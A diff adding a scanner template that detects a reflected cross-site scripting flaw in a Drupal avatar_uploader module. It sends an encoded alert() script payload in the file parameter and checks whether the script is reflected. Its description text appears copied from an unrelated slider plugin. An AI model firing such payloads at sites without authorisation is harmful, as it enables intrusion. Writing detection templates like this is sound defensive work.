@@ -1,0 +1,25 @@
+id: Drupal-avatar_uploader-xss
+
+info:
+  name: Drupal avatar_uploader v7.x-1.0-beta8 - (XSS)
+  description: This plugin creates a avatar_uploader from any post types. The slider import search feature and tab parameter via plugin settings are vulnerable to reflected cross-site scripting.
+  reference:
+    - https://www.exploit-db.com/exploits/50841
+  author: bywalks
+  severity: medium
+  tags: xss,drupal
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/avatar_uploader.pages.inc?file=%3Cscript%3Ealert(%22test%22)%3C%2Fscript%3E"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<script>alert(\"test\")</script>"
